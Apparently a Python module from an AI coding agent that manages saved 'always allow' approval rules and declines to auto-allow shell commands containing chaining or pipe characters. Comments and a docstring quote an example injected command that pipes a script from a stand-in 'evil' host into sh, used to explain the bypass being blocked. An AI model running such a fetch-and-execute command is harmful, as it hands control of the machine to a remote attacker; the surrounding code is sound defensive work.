"""Persistent approval allowlist: "always allow this action pattern" rules.

The `A` key at an approval prompt (or /approval allow) saves a rule so the
same action never prompts again. Rules live in one JSON file
(`~/.nx/allowed.json`, override with NX_ALLOWED_FILE) and are checked BEFORE
the model risk classifier in _confirm(), so an allowed action costs no
round-trip. Each rule records:
  tool      — the tool name ("run_bash", "write_file", …) or "*" for any
  pattern   — a shell-style fnmatch pattern matched against the action
              string ("run: pytest*" etc.), or "*" for any action of the tool
  scope     — "project" (keyed to PROJECT_ROOT, the default) or "global"

Deny-first principle: YOLO and the level thresholds keep their existing
semantics; rules only ever ADD auto-allows for shapes the user has explicitly
blessed. `list`/`forget` (via /approval allow list|forget) manage the file.
"""
from __future__ import annotations

import fnmatch
import json
import os
import re
import time
from typing import Any, Optional

from ._private import atomic_write_private, private_dir
from . import _state as st

DEFAULT_FILENAME = "allowed.json"

# Actions containing any shell control character must NOT be auto-allowed by a
# saved rule, even when the prefix matches: fnmatch's `*` happily spans spaces
# and metacharacters, so a blessed `run: pytest*` would otherwise also admit
# `run: pytest && curl http://evil/x.sh | sh`. Instead of returning a hit we
# fall through to the normal approval path (local hint / risk classifier), so
# the wildcard only ever widens within one bare command's arguments. Kept as a
# module-level copy of _risk._SHELL_METACHARACTERS_RE to avoid the import
# cycle (_risk imports _state; both stay model/network-free, like the rest of
# this module).
_SHELL_METACHARACTERS_RE = re.compile(r"[;&|<>`$(){}\n*?~]")


def _contains_shell_metacharacters(action: str) -> bool:
    """True when the action text has shell control characters (chains, pipes,
    redirection, substitution, globs, …). `*` in a SAVED RULE is intentional
    widening, so patterns are exempt — this judges the ACTION only."""
    return bool(_SHELL_METACHARACTERS_RE.search(action))


def _allowed_path() -> str:
    override = os.environ.get("NX_ALLOWED_FILE", "")
    if override:
        return os.path.expanduser(override)
    return os.path.join(st.SESSION_HOME, DEFAULT_FILENAME)


def _load_rules() -> list[dict[str, Any]]:
    try:
        with open(_allowed_path(), encoding="utf-8") as f:
            data = json.load(f)
    except (OSError, json.JSONDecodeError, ValueError):
        return []
    if not isinstance(data, list):
        return []
    return [r for r in data if isinstance(r, dict)
            and isinstance(r.get("tool"), str) and isinstance(r.get("pattern"), str)]


def _save_rules(rules: list[dict[str, Any]]) -> None:
    path = _allowed_path()
    private_dir(os.path.dirname(path) or ".")
    # Allow rules encode command shapes the user has blessed — e.g. a
    # `run: curl *` pattern is itself a map to whatever secrets curl reaches.
    atomic_write_private(path, json.dumps(rules, indent=2))


def add_rule(tool: str, pattern: str, scope: str = "project") -> dict[str, Any]:
    """Persist one allow rule (deduped); returns the stored rule."""
    tool = (tool or "*").strip() or "*"
    pattern = (pattern or "*").strip()
    scope = scope if scope in ("project", "global") else "project"
    rule: dict[str, Any] = {
        "tool": tool, "pattern": pattern, "scope": scope,
        "created": time.strftime("%Y-%m-%d"),
    }
    if scope == "project":
        rule["project_root"] = st.PROJECT_ROOT or os.getcwd()
    rules = _load_rules()
    for existing in rules:
        if (existing.get("tool") == tool and existing.get("pattern") == pattern
                and existing.get("scope", "project") == scope
                and existing.get("project_root") == rule.get("project_root")):
            return existing  # already saved — idempotent
    rules.append(rule)
    _save_rules(rules)
    return rule


def forget(index: int) -> Optional[dict[str, Any]]:
    """Remove rule #index (1-based, as listed by list_rules). Returns it."""
    rules = _load_rules()
    if not (1 <= index <= len(rules)):
        return None
    removed = rules.pop(index - 1)
    _save_rules(rules)
    return removed


def forget_all() -> int:
    rules = _load_rules()
    _save_rules([])
    return len(rules)


def list_rules() -> list[dict[str, Any]]:
    """Rules that are ACTIVE in the current scope, most recent last."""
    rules = _load_rules()
    out = []
    for r in rules:
        if r.get("scope", "project") == "project" and (st.PROJECT_ROOT or os.getcwd()) != r.get("project_root"):
            continue
        out.append(r)
    return out


def check_allow(tool: str, action: str) -> tuple[str, str] | None:
    """Return the matching rule's (pattern, scope) if `action` is allowed for
    `tool` by a saved rule, else None. Called from _confirm() before the risk
    classifier. The action string already carries the tool's own prefix
    ("run: …", "edit <path> …", "write <path> (N bytes)"), so patterns match
    the same text the approval prompt shows.

    Shell-safety bail-out: if a run_bash action carries shell control
    characters (&&, ;, |, >, `…`, $(…), globs, …), no rule is allowed to
    auto-allow it — fnmatch `*` spans spaces and metacharacters, so a blessed
    `run: pytest*` would otherwise also match `run: pytest && curl … | sh`.
    Such actions fall through to the normal hint/classifier/prompt path; the
    wildcard's widening stays within a single bare command's arguments."""
    run_bash = tool in ("run_bash", "*")
    metachars = run_bash and _contains_shell_metacharacters(action)
    for rule in _load_rules():
        if rule.get("scope", "project") == "project" and (st.PROJECT_ROOT or os.getcwd()) != rule.get("project_root"):
            continue
        if rule.get("tool", "*") not in ("*", tool):
            continue
        if metachars:
            continue
        if fnmatch.fnmatchcase(action, rule.get("pattern", "*")):
            return (rule.get("pattern", "*"), rule.get("scope", "project"))
    return None


DEFAULT_SCOPE = "project"


def _allowlist_tool(action: str) -> str:
    """The tool name a saved rule must match for `action`. nx's action strings
    all carry the tool's own prefix, so this inverts that mapping.

    The memory arms MUST come before the file arms: `write memory <path> (N
    bytes)` and `delete memory <path> (N bytes)` both start with `write `/`delete
    `, so the old ordering classified them as write_file/delete_file — no saved
    rule for memory_write could ever match, and a `/approval allow memory_write`
    rule was silently inert.
    """
    if action.startswith("run: "):
        return "run_bash"
    if action.startswith("write memory"):
        return "memory_write"
    if action.startswith("delete memory"):
        return "memory_delete"
    if action.startswith(("edit ", "write ", "delete ")):
        return ("edit_file" if action.startswith("edit ")
                else "delete_file" if action.startswith("delete ")
                else "write_file")
    if action.startswith("git commit: "):
        return "git_commit"
    return "*"


def _rule_from_action(action: str) -> tuple[str, str, str]:
    """Derive (tool, pattern, scope) for an `A`-key save from the action shown
    at the approval prompt. The pattern is deliberately *prefix-shaped*
    (`action + "*"`), not the raw action: 'always allow' means this shape of
    action, not this exact byte-string — e.g. `run: pytest tests/ -q` blesses
    future `pytest` invocations too. Exact-byte blessings would be near-useless
    since tool args almost never repeat verbatim.

    memory_write/memory_delete are the exception: their action carries a
    *byte count* (`write memory <path> (N bytes)`) or a *path* (`delete memory
    <path> (N bytes)`), so a prefix blessing would be a blessing for that exact
    write — every future note re-prompts. The pattern is widened to the tool's
    whole action family (`write memory *` / `delete memory *`) so `A` means
    "stop asking about memory writes/deletes", which is what a user pressing it
    is asking for (a memory write is a private note, not a repo edit).
    """
    tool = _allowlist_tool(action)
    if tool == "memory_write":
        return (tool, "write memory *", DEFAULT_SCOPE)
    if tool == "memory_delete":
        return (tool, "delete memory *", DEFAULT_SCOPE)
    return (tool, action + "*", DEFAULT_SCOPE)
